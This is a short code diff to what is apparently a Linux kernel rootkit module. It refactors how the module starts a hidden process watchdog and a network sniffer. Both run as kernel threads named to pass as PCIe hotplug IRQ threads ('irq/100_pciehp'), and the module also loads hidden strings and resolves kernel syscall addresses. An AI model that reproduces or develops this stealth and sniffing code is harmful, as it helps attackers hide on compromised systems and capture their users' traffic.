@@ -585,7 +585,6 @@ static ssize_t write_cb(struct file *fptr, const char __user *user,
             load_hidden_string(&buf[3]);
         }
     }
-prctime:
     proc_timeout(PRC_RESET);
 leave:
     kfree(buf);
@@ -740,7 +739,7 @@ static void _unroll_init(void) {
 static int __init kv_init(void) {
 
     int rv = 0;
-    char *tname, *magik, *procname_err = "";
+    char *magik, *procname_err = "";
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(5,17,0)
     struct kernel_syscalls *kaddr = NULL;
 #endif
@@ -771,19 +770,17 @@ static int __init kv_init(void) {
     if (!sys_init())
         goto sys_init_error;
 
-    tname = "irq/100_pciehp";
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(5,17,0)
     kaddr = kv_kall_load_addr();
     if (!kaddr || !kaddr->k_do_exit)
         goto cont;
 #endif
-    tsk_prc = kthread_run(_proc_watchdog, NULL, tname);
+    tsk_prc = kthread_run(_proc_watchdog, NULL, THREAD_PROC_NAME);
     if (!tsk_prc)
         goto unroll_init;
 
 cont:
-    tname = "irq/101_pciehp";
-    tsk_sniff = kv_sock_start_sniff(tname);
+    tsk_sniff = kv_sock_start_sniff();
     if (!tsk_sniff)
         goto unroll_init;
 
